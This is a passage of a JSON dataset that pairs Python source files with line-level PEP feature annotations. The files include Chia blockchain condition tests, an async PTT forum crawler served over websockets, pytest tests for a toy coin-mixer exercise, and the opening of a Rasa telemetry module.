npc_result.error in [Err.INVALID_CONDITION.value, Err.GENERATOR_RUNTIME_ERROR.value]\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_duplicate_height_time_conditions(self, rust_checker: bool):\n        for cond in [80, 81, 82, 83]:\n            npc_result = generator_condition_tester(\n                \" \".join([f\"({cond} {i})\" for i in range(50, 101)]), rust_checker=rust_checker\n            )\n            assert npc_result.error is None\n            assert len(npc_result.npc_list) == 1\n            opcode = ConditionOpcode(bytes([cond]))\n            max_arg = 0\n            assert npc_result.npc_list[0].conditions[0][0] == opcode\n            for c in npc_result.npc_list[0].conditions[0][1]:\n                assert c.opcode == opcode\n                max_arg = max(max_arg, int_from_bytes(c.vars[0]))\n            assert max_arg == 100\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_just_announcement(self, rust_checker: bool):\n        for cond in [60, 62]:\n            message = \"a\" * 1024\n            npc_result = generator_condition_tester(f'({cond} \"{message}\") ' * 50, rust_checker=rust_checker)\n            assert npc_result.error is None\n            assert len(npc_result.npc_list) == 1\n            if rust_checker:\n                assert npc_result.npc_list[0].conditions == []\n            else:\n                assert len(npc_result.npc_list[0].conditions) == 1\n                print(npc_result.npc_list[0].conditions[0][0])\n                assert npc_result.npc_list[0].conditions[0][0] == ConditionOpcode(bytes([cond]))\n                assert len(npc_result.npc_list[0].conditions[0][1]) == 50\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_assert_announcement_fail(self, rust_checker: bool):\n        for cond in [61, 63]:\n            message = \"a\" * 1024\n            npc_result = generator_condition_tester(f'({cond} \"{message}\") ', rust_checker=rust_checker)\n            assert npc_result.error == Err.ASSERT_ANNOUNCE_CONSUMED_FAILED.value\n            assert npc_result.npc_list == []\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_multiple_reserve_fee(self, rust_checker: bool):\n        cond = 52\n        npc_result = generator_condition_tester(f\"({cond} 100) \" * 3, rust_checker=rust_checker)\n        assert npc_result.error is None\n        assert len(npc_result.npc_list) == 1\n        opcode = ConditionOpcode(bytes([cond]))\n        reserve_fee = 0\n        assert len(npc_result.npc_list[0].conditions) == 1\n        assert npc_result.npc_list[0].conditions[0][0] == opcode\n        for c in npc_result.npc_list[0].conditions[0][1]:\n            assert c.opcode == opcode\n            reserve_fee += int_from_bytes(c.vars[0])\n        assert reserve_fee == 300\n        if rust_checker:\n            assert len(npc_result.npc_list[0].conditions[0][1]) == 1\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_duplicate_outputs(self, rust_checker: bool):\n        puzzle_hash = \"abababababababababababababababab\"\n        npc_result = generator_condition_tester(f'(51 \"{puzzle_hash}\" 10) ' * 2, rust_checker=rust_checker)\n        if rust_checker:\n            assert npc_result.error == Err.DUPLICATE_OUTPUT.value\n            assert npc_result.npc_list == []\n        else:\n            assert npc_result.error is None\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_create_coin_cost(self, rust_checker: bool):\n        puzzle_hash = \"abababababababababababababababab\"\n        npc_result = generator_condition_tester(\n            f'(51 \"{puzzle_hash}\" 10) ', max_cost=20470 + 95 * COST_PER_BYTE + 1800000, rust_checker=rust_checker\n        )\n        assert npc_result.error is None\n        assert npc_result.clvm_cost == 20470\n        assert len(npc_result.npc_list) == 1\n        npc_result = generator_condition_tester(\n            f'(51 \"{puzzle_hash}\" 10) ', max_cost=20470 + 95 * COST_PER_BYTE + 1800000 - 1, rust_checker=rust_checker\n        )\n        assert npc_result.error in [Err.BLOCK_COST_EXCEEDS_MAX.value, Err.INVALID_BLOCK_COST.value]\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_agg_sig_cost(self, rust_checker: bool):\n        pubkey = \"abababababababababababababababababababababababab\"\n        npc_result = generator_condition_tester(\n            f'(49 \"{pubkey}\" \"foobar\") ', max_cost=20512 + 117 * COST_PER_BYTE + 1200000, rust_checker=rust_checker\n        )\n        assert npc_result.error is None\n        assert npc_result.clvm_cost == 20512\n        assert len(npc_result.npc_list) == 1\n        npc_result = generator_condition_tester(\n            f'(49 \"{pubkey}\" \"foobar\") ', max_cost=20512 + 117 * COST_PER_BYTE + 1200000 - 1, rust_checker=rust_checker\n        )\n        assert npc_result.error in [Err.BLOCK_COST_EXCEEDS_MAX.value, Err.INVALID_BLOCK_COST.value]\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_create_coin_different_parent(self, rust_checker: bool):\n        puzzle_hash = \"abababababababababababababababab\"\n        program = SerializedProgram.from_bytes(\n            binutils.assemble(\n                f'(q ((0x0101010101010101010101010101010101010101010101010101010101010101 (q (51 \"{puzzle_hash}\" 10)) 123 (() (q . ())))(0x0101010101010101010101010101010101010101010101010101010101010102 (q (51 \"{puzzle_hash}\" 10)) 123 (() (q . ()))) ))'  \n            ).as_bin()\n        )\n        generator = BlockGenerator(program, [])\n        npc_result: NPCResult = get_name_puzzle_conditions(\n            generator, MAX_BLOCK_COST_CLVM, cost_per_byte=COST_PER_BYTE, safe_mode=False, rust_checker=rust_checker\n        )\n        assert npc_result.error is None\n        assert len(npc_result.npc_list) == 2\n        opcode = ConditionOpcode.CREATE_COIN\n        for c in npc_result.npc_list:\n            assert c.conditions == [\n                (\n                    opcode.value,\n                    [ConditionWithArgs(opcode, [puzzle_hash.encode(\"ascii\"), bytes([10])])],\n                )\n            ]\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_create_coin_different_puzzhash(self, rust_checker: bool):\n        puzzle_hash_1 = \"abababababababababababababababab\"\n        puzzle_hash_2 = \"cbcbcbcbcbcbcbcbcbcbcbcbcbcbcbcb\"\n        npc_result = generator_condition_tester(\n            f'(51 \"{puzzle_hash_1}\" 5) (51 \"{puzzle_hash_2}\" 5)', rust_checker=rust_checker\n        )\n        assert npc_result.error is None\n        assert len(npc_result.npc_list) == 1\n        opcode = ConditionOpcode.CREATE_COIN\n        assert (\n            ConditionWithArgs(opcode, [puzzle_hash_1.encode(\"ascii\"), bytes([5])])\n            in npc_result.npc_list[0].conditions[0][1]\n        )\n        assert (\n            ConditionWithArgs(opcode, [puzzle_hash_2.encode(\"ascii\"), bytes([5])])\n            in npc_result.npc_list[0].conditions[0][1]\n        )\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_create_coin_different_amounts(self, rust_checker: bool):\n        puzzle_hash = \"abababababababababababababababab\"\n        npc_result = generator_condition_tester(\n            f'(51 \"{puzzle_hash}\" 5) (51 \"{puzzle_hash}\" 4)', rust_checker=rust_checker\n        )\n        assert npc_result.error is None\n        assert len(npc_result.npc_list) == 1\n        opcode = ConditionOpcode.CREATE_COIN\n        assert (\n            ConditionWithArgs(opcode, [puzzle_hash.encode(\"ascii\"), bytes([5])])\n            in npc_result.npc_list[0].conditions[0][1]\n        )\n        assert (\n            ConditionWithArgs(opcode, [puzzle_hash.encode(\"ascii\"), bytes([4])])\n            in npc_result.npc_list[0].conditions[0][1]\n        )\n    @pytest.mark.parametrize(\"rust_checker\", [True, False])\n    def test_unknown_condition(self, rust_checker: bool):\n        for sm in [True, False]:\n            for c in ['(1 100 \"foo\" \"bar\")', \"(100)\", \"(1 1) (2 2) (3 3)\", '(\"foobar\")']:\n                npc_result = generator_condition_tester(c, safe_mode=sm, rust_checker=rust_checker)\n                print(npc_result)\n                if sm:\n                    assert npc_result.error == Err.INVALID_CONDITION.value\n                    assert npc_result.npc_list == []\n                else:\n                    assert npc_result.error is None\n                    assert npc_result.npc_list[0].conditions == []",
            "patterns": {
                "pep_468": [
                    [
                        265,
                        "generate_test_spend_bundle(*args, **kwargs)"
                    ]
                ],
                "pep_526": [
                    [
                        1505,
                        "npc_result: NPCResult = get_name_puzzle_conditions("
                    ],
                    [
                        180,
                        "tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle)"
                    ],
                    [
                        244,
                        "tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)"
                    ],
                    [
                        253,
                        "tx2: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle2)"
                    ],
                    [
                        351,
                        "tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)"
                    ],
                    [
                        374,
                        "tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(bundle)"
                    ],
                    [
                        610,
                        "tx2: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)"
                    ],
                    [
                        988,
                        "tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)"
                    ],
                    [
                        1020,
                        "tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle_combined)"
                    ],
                    [
                        1044,
                        "unsigned: List[CoinSpend] = spend_bundle_0.coin_spends"
                    ],
                    [
                        1046,
                        "coin_spend: CoinSpend = unsigned[0]"
                    ],
                    [
                        1621,
                        "npc_result: NPCResult = get_name_puzzle_conditions("
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_585": [
                    [
                        3,
                        "from typing import Dict, List, Optional, Tuple, Callable",
                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import Dict, List, Optional, Tuple, Callable",
                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import Dict, List, Optional, Tuple, Callable",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        46,
                        "    condition_dic: Dict[ConditionOpcode, List[ConditionWithArgs]] = None,",
                        "violation"
                    ],
                    [
                        1044,
                        "        unsigned: List[CoinSpend] = spend_bundle_0.coin_spends",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        61,
                        70,
                        "async generator",
                        "async def two_nodes():\n    async_gen = setup_simulators_and_wallets(2, 1, {})\n    nodes, _ = await async_gen.__anext__()\n    full_node_1 = nodes[0]\n    full_node_2 = nodes[1]\n    server_1 = full_node_1.full_node.server\n    server_2 = full_node_2.full_node.server\n    yield full_node_1, full_node_2, server_1, server_2\n    async for _ in async_gen:\n        yield _"
                    ],
                    [
                        69,
                        70,
                        "async for",
                        "async for _ in async_gen:\n        yield _"
                    ]
                ],
                "pep_498": [
                    [
                        1500,
                        "    prg = f\"(q ((0x0101010101010101010101010101010101010101010101010101010101010101 {'(q ' if quote else ''} {conditions} {')' if quote else ''} 123 (() (q . ())))))\"  "
                    ],
                    [
                        1501,
                        "    print(f\"program: {prg}\")"
                    ],
                    [
                        1504,
                        "    print(f\"len: {len(bytes(program))}\")"
                    ],
                    [
                        182,
                        "        log.info(f\"Res {res}\")"
                    ],
                    [
                        1590,
                        "            f'(51 \"{puzzle_hash}\" 10) ', max_cost=20470 + 95 * COST_PER_BYTE + 1800000, rust_checker=rust_checker"
                    ],
                    [
                        1596,
                        "            f'(51 \"{puzzle_hash}\" 10) ', max_cost=20470 + 95 * COST_PER_BYTE + 1800000 - 1, rust_checker=rust_checker"
                    ],
                    [
                        1603,
                        "            f'(49 \"{pubkey}\" \"foobar\") ', max_cost=20512 + 117 * COST_PER_BYTE + 1200000, rust_checker=rust_checker"
                    ],
                    [
                        1609,
                        "            f'(49 \"{pubkey}\" \"foobar\") ', max_cost=20512 + 117 * COST_PER_BYTE + 1200000 - 1, rust_checker=rust_checker"
                    ],
                    [
                        1639,
                        "            f'(51 \"{puzzle_hash_1}\" 5) (51 \"{puzzle_hash_2}\" 5)', rust_checker=rust_checker"
                    ],
                    [
                        1656,
                        "            f'(51 \"{puzzle_hash}\" 5) (51 \"{puzzle_hash}\" 4)', rust_checker=rust_checker"
                    ],
                    [
                        1558,
                        "            npc_result = generator_condition_tester(f'({cond} \"{message}\") ', rust_checker=rust_checker)"
                    ],
                    [
                        1564,
                        "        npc_result = generator_condition_tester(f\"({cond} 100) \" * 3, rust_checker=rust_checker)"
                    ],
                    [
                        1580,
                        "        npc_result = generator_condition_tester(f'(51 \"{puzzle_hash}\" 10) ' * 2, rust_checker=rust_checker)"
                    ],
                    [
                        1544,
                        "            npc_result = generator_condition_tester(f'({cond} \"{message}\") ' * 50, rust_checker=rust_checker)"
                    ],
                    [
                        1529,
                        "                \" \".join([f\"({cond} {i})\" for i in range(50, 101)]), rust_checker=rust_checker"
                    ],
                    [
                        1617,
                        "                f'(q ((0x0101010101010101010101010101010101010101010101010101010101010101 (q (51 \"{puzzle_hash}\" 10)) 123 (() (q . ())))(0x0101010101010101010101010101010101010101010101010101010101010102 (q (51 \"{puzzle_hash}\" 10)) 123 (() (q . ()))) ))'  "
                    ]
                ]
            }
        },
        "34": {
            "file": "import os\nimport re\nimport json\nimport weakref\nimport logging\nimport traceback\nfrom datetime import datetime\nfrom bs4 import BeautifulSoup\nfrom aiohttp import web\nimport aiohttp\nimport asyncio\nimport requests\nfrom utils import parse_content\nLOG_LEVEL = logging.DEBUG\nFORMAT = '%(asctime)s-%(funcName)-10s(%(lineno)d) %(levelname)-5s: %(message)s'\nlogging.basicConfig(\n    level=LOG_LEVEL,\n    format=FORMAT,\n)\nlogger = logging.getLogger('aiohttp.access')\nWS_DOMAIN = os.getenv(\"WS_DOMAIN\", \"localhost\")\nWS_HOST = os.getenv(\"WS_HOST\", \"127.0.0.1\")\nWS_PORT = int(os.getenv(\"WS_PORT\", 5000))\nMAX_THREADS = 5\nPTT_URL = 'https://www.ptt.cc'\nasync def cancel_tasks(request):\n    try:\n        channel_id = request.match_info.get(\"channel_id\")\n        logger.debug(f'ws: {channel_id}')\n        ws = request.app[\"websockets\"].pop(channel_id, None)\n        await ws.close()\n        rep = f'id: {channel_id}, websocket canceled'\n    except:\n        rep = f'id: {channel_id}, websocket cancel failed'\n    return web.Response(text=rep)\nasync def socket_handler(request):\n    channel_id = request.match_info.get(\"channel_id\")\n    ws = web.WebSocketResponse()\n    await ws.prepare(request)\n    request.app[\"websockets\"][channel_id] = ws\n    logger.info(f\"Client connected: {channel_id}\")\n    try:\n        async for msg in ws:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                req = json.loads(msg.data)\n                if req['type'] == 'PTT':\n                    board = req['board']\n                    datetime.strptime(\"20210108\", \"%Y%m%d\")\n                    target_start_date = datetime.strptime(req['start_date'], \"%Y%m%d\")\n                    target_end_date = datetime.strptime(req['end_date'], \"%Y%m%d\")\n                    key_word = req['key_word']\n                    start_page = 1\n                    last_page = await get_last_page(board)\n                    logger.info(f'Board: {board}, Last page: {last_page}')\n                    page_list = [p for p in range(start_page, last_page + 1)]\n                    logger.info(f'Page list length: {len(page_list)}')\n                    target_start_page = await search_target_date_page(\n                        page_list, target_start_date, page_list.index(start_page), len(page_list) - 1, board\n                    )\n                    logger.info(f'Target start page: {target_start_page}')\n                    page_queue = asyncio.Queue()\n                    div_queue = asyncio.Queue()\n                    [page_queue.put_nowait(i) for i in range(target_start_page, last_page + 1)]\n                    article_ids_tasks = [\n                        handle_article_ids_tasks(task_id, page_queue, div_queue, ws, board)\n                        for task_id in range(MAX_THREADS)\n                    ]\n                    divs_tasks = [\n                        handle_divs_tasks(task_id, div_queue, ws, key_word, target_end_date, board)\n                        for task_id in range(MAX_THREADS)\n                    ]\n                    logger.info('Start crawler tasks ...')\n                    for t in article_ids_tasks + divs_tasks:\n                        asyncio.ensure_future(t, loop=loop)\n    except:\n        logger.error(str(traceback.format_exc()))\n    finally:\n        request.app[\"websockets\"].pop(channel_id, None)\n        logger.info(f\"Client connection closed: {channel_id}\")\n        raise web.HTTPOk()\nasync def handle_article_ids_tasks(task_id, page_queue, div_queue, ws, board):\n    while not page_queue.empty():\n        if ws.closed:\n            logger.debug(f'Websocket connection closed, article_ids_task left, task id: [{task_id}]')\n            return\n        current_req = await page_queue.get()\n        try:\n            await get_article_ids(current_req, div_queue, board)\n        except ConnectionResetError:\n            logger.error(f'Websocket connection error, article_ids_task left, task id: [{task_id}]')\n        except:\n            logger.debug(traceback.format_exc())\nasync def get_article_ids(req, div_queue, board):\n    async with aiohttp.ClientSession() as session:\n        logger.debug(f'Processing index: {str(req)}')\n        async with session.get(url=PTT_URL + '/bbs/' + board + '/index' + str(req) + '.html', timeout=30) as response:\n            assert response.status == 200\n            csv_content = await response.text()\n            soup = BeautifulSoup(csv_content, 'html.parser')\n            divs = soup.find_all(\"div\", \"r-ent\")\n            [div_queue.put_nowait(div) for div in divs]\n            return True\nasync def handle_divs_tasks(task_id, div_queue, ws, key_word, target_end_date, board):\n    while True:\n        if ws.closed:\n            logger.debug(f'Websocket connection closed, divs_task left, task id: [{task_id}]')\n            return\n        current_div = await div_queue.get()\n        try:\n            success, content = await parse_the_article(current_div, key_word, target_end_date, board)\n            if success:\n                await ws.send_json(content)\n            else:\n                logger.debug(f'Content message: {content}')\n        except ConnectionResetError:\n            logger.error(f'Websocket connection error, divs_task left, task id: [{task_id}]')\n        except:\n            logger.debug(traceback.format_exc())\n        if div_queue.empty():\n            if task_id == MAX_THREADS - 1:\n                await ws.send_str('done')\n            return\nasync def parse_the_article(div, key_word, target_end_date, board):\n    href = div.find('a')['href']\n    link = PTT_URL + href\n    article_id = re.sub('\\.html', '', href.split('/')[-1])\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url=link, cookies={'over18': '1'}, timeout=30) as response:\n            assert response.status == 200\n            rep = await response.text()\n            soup = BeautifulSoup(rep, 'html.parser')\n            content = parse_content(soup.find(id=\"main-content\"), link, article_id, board)\n            if key_word:\n                article_date = datetime.strptime(str(content['date']), \"%a %b %d %H:%M:%S %Y\")\n                if article_date > target_end_date:\n                    return False, 'Out of date.'\n                if key_word not in str(content):\n                    return False, 'No key word in content'\n                messages = content.get('messages')\n                content['messages'] = []\n                for m in messages:\n                    if key_word in str(m):\n                        content['messages'].append(m)\n                content['content'] = content.get('content') if key_word in str(content.get('content')) else ''\n            return True, content\nasync def get_last_page(board, timeout=3):\n    async with aiohttp.ClientSession() as session:\n        req_url = PTT_URL + '/bbs/' + board + '/index.html'\n        async with session.get(url=req_url, cookies={'over18': '1'}, timeout=timeout) as response:\n            assert response.status == 200\n            content = await response.text()\n            first_page = re.search(r'href=\"/bbs/' + board + r'/index(\\d+).html\">&lsaquo;', content)\n            if first_page is None:\n                return 1\n            return int(first_page.group(1)) + 1\nasync def search_target_date_page(page_list, target_date, start_index, end_index, board):\n    while end_index >= start_index:\n        middle_index = round((start_index + end_index) / 2)\n        date_article_first, date_article_last = await get_article_first_last_date(page_list, middle_index, board)\n        logger.debug(f'{date_article_first} | < {target_date.date()} > | {date_article_last}')\n        if date_article_first.date() <= target_date.date() <= date_article_last.date():\n            return page_list[middle_index]\n        elif date_article_first.date() < target_date.date():\n            start_index = middle_index + 1\n        else:\n            end_index = middle_index - 1\n    logger.info(\n        f'Can not find target date, the nearest date page: {page_list[start_index]}, start index: {start_index}, end_index: {end_index}'\n    )\n    return page_list[end_index]\nasync def get_article_first_last_date(page_list, page_index, board):\n    async with aiohttp.ClientSession() as session:\n        req_url = PTT_URL + '/bbs/' + board + '/index' + str(page_list[page_index]) + '.html'\n        async with session.get(url=req_url, cookies={'over18': '1'}, timeout=30) as response:\n            assert response.status == 200\n            content = await response.text()\n            soup = BeautifulSoup(content, 'html.parser')\n            divs = soup.find_all(\"div\", \"r-ent\")\n            if len(page_list) - 1 == page_index:\n                filtered_divs = [\n                    div\n                    for div in divs\n                    if div.find('div', 'mark').text != 'M' and '(\u672c\u6587\u5df2\u88ab\u522a\u9664)' not in div.find('div', 'title').text\n                ]\n            else:\n                filtered_divs = [div for div in divs if '(\u672c\u6587\u5df2\u88ab\u522a\u9664)' not in div.find('div', 'title').text]\n            date_article_first = ''\n            date_article_last = ''\n            reverse_index = -1\n            for i in range(len(filtered_divs)):\n                try:\n                    if not date_article_first:\n                        link = PTT_URL + filtered_divs[i].find('a')['href']\n                        resp = requests.get(url=link, cookies={'over18': '1'})\n                        soup = BeautifulSoup(resp.text, 'html.parser')\n                        main_content = soup.find(id=\"main-content\")\n                        metas = main_content.select('div.article-metaline')\n                        date = metas[2].select('span.article-meta-value')[0].string\n                        date_article_first = datetime.strptime(date, \"%a %b %d %H:%M:%S %Y\")\n                    if not date_article_last:\n                        link = PTT_URL + filtered_divs[reverse_index].find('a')['href']\n                        resp = requests.get(url=link, cookies={'over18': '1'})\n                        soup = BeautifulSoup(resp.text, 'html.parser')\n                        main_content = soup.find(id=\"main-content\")\n                        metas = main_content.select('div.article-metaline')\n                        date = metas[2].select('span.article-meta-value')[0].string\n                        date_article_last = datetime.strptime(date, \"%a %b %d %H:%M:%S %Y\")\n                except Exception as e:\n                    logger.debug(e)\n                if date_article_first and date_article_last:\n                    break\n                reverse_index -= 1\n            return date_article_first, date_article_last\nasync def index(request):\n    return web.FileResponse('./index.html')\nasync def criteria(request):\n    return web.FileResponse('./static/criteria.html')\nasync def result_page(request):\n    return web.FileResponse('./static/result.html')\ndef main():\n    aio_app = web.Application()\n    aio_app[\"websockets\"] = weakref.WeakValueDictionary()\n    aio_app.router.add_route('GET', '/index', criteria)\n    aio_app.router.add_route('GET', '/result', result_page)\n    aio_app.add_routes([web.static('/static', './static')])\n    aio_app.router.add_route('GET', '/socket/{channel_id}', socket_handler)\n    aio_app.router.add_route('GET', '/socket/cancel/{channel_id}', cancel_tasks)\n    runner = web.AppRunner(aio_app, access_log=logger)\n    loop.run_until_complete(runner.setup())\n    site = web.TCPSite(runner, WS_HOST, WS_PORT)\n    loop.run_until_complete(site.start())\n    loop.run_forever()\nif __name__ == \"__main__\":\n    loop = asyncio.get_event_loop()\n    main()",
            "patterns": {
                "pep_567": [
                    [
                        11,
                        11,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        43,
                        74,
                        "async for",
                        "async for msg in ws:\n            if msg.type == aiohttp.WSMsgType.TEXT:\n                req = json.loads(msg.data)\n                if req['type'] == 'PTT':\n                    board = req['board']\n                    datetime.strptime(\"20210108\", \"%Y%m%d\")\n                    target_start_date = datetime.strptime(req['start_date'], \"%Y%m%d\")\n                    target_end_date = datetime.strptime(req['end_date'], \"%Y%m%d\")\n                    key_word = req['key_word']\n                    start_page = 1\n                    last_page = await get_last_page(board)\n                    logger.info(f'Board: {board}, Last page: {last_page}')\n                    page_list = [p for p in range(start_page, last_page + 1)]\n                    logger.info(f'Page list length: {len(page_list)}')\n                    target_start_page = await search_target_date_page(\n                        page_list, target_start_date, page_list.index(start_page), len(page_list) - 1, board\n                    )\n                    logger.info(f'Target start page: {target_start_page}')\n                    page_queue = asyncio.Queue()\n                    div_queue = asyncio.Queue()\n                    [page_queue.put_nowait(i) for i in range(target_start_page, last_page + 1)]\n                    article_ids_tasks = [\n                        handle_article_ids_tasks(task_id, page_queue, div_queue, ws, board)\n                        for task_id in range(MAX_THREADS)\n                    ]\n                    divs_tasks = [\n                        handle_divs_tasks(task_id, div_queue, ws, key_word, target_end_date, board)\n                        for task_id in range(MAX_THREADS)\n                    ]\n                    logger.info('Start crawler tasks ...')\n                    for t in article_ids_tasks + divs_tasks:\n                        asyncio.ensure_future(t, loop=loop)"
                    ]
                ],
                "pep_498": [
                    [
                        32,
                        "        rep = f'id: {channel_id}, websocket canceled'"
                    ],
                    [
                        41,
                        "    logger.info(f\"Client connected: {channel_id}\")"
                    ],
                    [
                        168,
                        "        f'Can not find target date, the nearest date page: {page_list[start_index]}, start index: {start_index}, end_index: {end_index}'"
                    ],
                    [
                        29,
                        "        logger.debug(f'ws: {channel_id}')"
                    ],
                    [
                        34,
                        "        rep = f'id: {channel_id}, websocket cancel failed'"
                    ],
                    [
                        79,
                        "        logger.info(f\"Client connection closed: {channel_id}\")"
                    ],
                    [
                        95,
                        "        logger.debug(f'Processing index: {str(req)}')"
                    ],
                    [
                        160,
                        "        logger.debug(f'{date_article_first} | < {target_date.date()} > | {date_article_last}')"
                    ],
                    [
                        84,
                        "            logger.debug(f'Websocket connection closed, article_ids_task left, task id: [{task_id}]')"
                    ],
                    [
                        106,
                        "            logger.debug(f'Websocket connection closed, divs_task left, task id: [{task_id}]')"
                    ],
                    [
                        90,
                        "            logger.error(f'Websocket connection error, article_ids_task left, task id: [{task_id}]')"
                    ],
                    [
                        114,
                        "                logger.debug(f'Content message: {content}')"
                    ],
                    [
                        116,
                        "            logger.error(f'Websocket connection error, divs_task left, task id: [{task_id}]')"
                    ],
                    [
                        54,
                        "                    logger.info(f'Board: {board}, Last page: {last_page}')"
                    ],
                    [
                        56,
                        "                    logger.info(f'Page list length: {len(page_list)}')"
                    ],
                    [
                        60,
                        "                    logger.info(f'Target start page: {target_start_page}')"
                    ]
                ]
            }
        },
        "35": {
            "file": "import asyncio\nfrom decimal import Decimal\nfrom unittest.mock import MagicMock, AsyncMock, call\nimport pytest\nfrom taurus.config import MixerConfig\nfrom taurus.domain import Address, PendingDepositMix, PendingSettlementMix\nfrom taurus.gemini_client import GeminiClient\nfrom taurus.mixer import Mixer\nfrom taurus.spreaders import spread_evenly\n@pytest.fixture\ndef gemini_client():\n    return MagicMock(spec=GeminiClient)\n@pytest.fixture\n@pytest.mark.asyncio\nasync def mixer(gemini_client):\n    config = MixerConfig(0.0, 0.0, 3)\n    mixer = Mixer(gemini_client, spread_evenly, Address(\"house\"), config)\n    yield mixer\n    mixer.stop()\n@pytest.mark.asyncio\nasync def test_start_mixing_settles_on_reaching_pending_floor(mixer: Mixer):\n    mixer._settle = AsyncMock()\n    mixer._pending_mixes = [1, 2, 3]\n    await asyncio.sleep(0)\n    mixer._settle.assert_called()\n@pytest.mark.asyncio\nasync def test_start_mixing_does_not_settle_below_pending_floor(mixer: Mixer):\n    mixer._settle = AsyncMock()\n    await asyncio.sleep(0)\n    mixer._settle.assert_not_called()\n@pytest.mark.asyncio\nasync def test_watch_polls_deposit_address(gemini_client, mixer: Mixer):\n    mix = PendingDepositMix([], Address(\"deposit\"))\n    balance = MagicMock()\n    balance.json.return_value = {\"balance\": \"0.1\"}\n    gemini_client.address_info = AsyncMock(return_value=balance)\n    mixer.watch(mix)\n    await asyncio.sleep(0)\n    gemini_client.address_info.assert_called_with(\"deposit\")\n@pytest.mark.asyncio\nasync def test_watch_sends_jobcoins_when_deposit_detected(gemini_client, mixer: Mixer):\n    mix = PendingDepositMix([Address(\"destination\")], Address(\"deposit\"))\n    balance = MagicMock()\n    balance.json.return_value = {\"balance\": \"0.1\"}\n    gemini_client.address_info = AsyncMock(return_value=balance)\n    mixer.watch(mix)\n    await asyncio.sleep(0)\n    gemini_client.send_jobcoins.assert_called_with(Address(\"deposit\"), Address(\"house\"), \"0.1\")\n@pytest.mark.asyncio\nasync def test_settle_uses_spreader(mixer: Mixer):\n    mixer._pending_mixes = [1, 2, 3]\n    mixer._spreader = MagicMock()\n    await mixer._settle()\n    assert mixer._spreader.call_args_list == [call(1), call(2), call(3)]\n@pytest.mark.asyncio\nasync def test_settle_sends_transactions(gemini_client, mixer: Mixer):\n    mixer._pending_mixes = [\n        PendingSettlementMix(\n            [Address(\"destination_a\"), Address(\"destination_b\")],\n            Address(\"deposit_a\"),\n            Decimal(\"1\"),\n        ),\n        PendingSettlementMix([Address(\"destination_c\")], Address(\"deposit_b\"), Decimal(\"1\")),\n    ]\n    await mixer._settle()\n    await asyncio.sleep(0)\n    assert gemini_client.send_jobcoins.call_args_list == [\n        call(\"house\", \"destination_a\", \"0.5\"),\n        call(\"house\", \"destination_b\", \"0.5\"),\n        call(\"house\", \"destination_c\", \"1\"),\n    ]\n@pytest.mark.asyncio\nasync def test_settle_clears_pending(mixer: Mixer):\n    mixer._pending_mixes = [\n        PendingSettlementMix(\n            [Address(\"destination_a\"), Address(\"destination_b\")],\n            Address(\"deposit_a\"),\n            Decimal(\"1\"),\n        ),\n        PendingSettlementMix([Address(\"destination_c\")], Address(\"deposit_b\"), Decimal(\"1\")),\n    ]\n    await mixer._settle()\n    assert not mixer._pending_mixes",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        15,
                        19,
                        "async generator",
                        "async def mixer(gemini_client):\n    config = MixerConfig(0.0, 0.0, 3)\n    mixer = Mixer(gemini_client, spread_evenly, Address(\"house\"), config)\n    yield mixer\n    mixer.stop()"
                    ]
                ]
            }
        },
        "36": {
            "file": "import asyncio\nfrom datetime import datetime\nimport functools\nfrom functools import wraps\nimport hashlib\nimport json\nimport logging\nimport multiprocessing\nimport os\nfrom pathlib import Path\nimport platform\nimport sys\nimport textwrap\nimport typing\nfrom typing import Any, Callable, Dict, List, Optional, Text\nimport uuid\nimport async_generator\nimport requests\nfrom terminaltables import SingleTable\nimport rasa\nfrom rasa import model\nfrom rasa.constants import (\n    CONFIG_FILE_TELEMETRY_KEY,\n    CONFIG_TELEMETRY_DATE,\n    CONFIG_TELEMETRY_ENABLED,\n    CONFIG_TELEMETRY_ID,\n)\nfrom rasa.shared.constants import DOCS_URL_TELEMETRY\nfrom rasa.shared.exceptions import RasaException\nimport rasa.shared.utils.io\nfrom rasa.utils import common as rasa_utils\nimport rasa.utils.io\nif typing.TYPE_CHECKING:\n    from rasa.core.brokers.broker import EventBroker\n    from rasa.core.tracker_store import TrackerStore\n    from rasa.core.channels.channel import InputChannel\n    from rasa.core.agent import Agent\n    from rasa.shared.nlu.training_data.training_data import TrainingData\n    from rasa.shared.importers.importer import TrainingDataImporter\n    from rasa.core.utils import AvailableEndpoints\nlogger = logging.getLogger(__name__)\nSEGMENT_ENDPOINT = \"https://api.segment.io/v1/track\"\nSEGMENT_REQUEST_TIMEOUT = 5  \nTELEMETRY_ENABLED_ENVIRONMENT_VARIABLE = \"RASA_TELEMETRY_ENABLED\"\nTELEMETRY_DEBUG_ENVIRONMENT_VARIABLE = 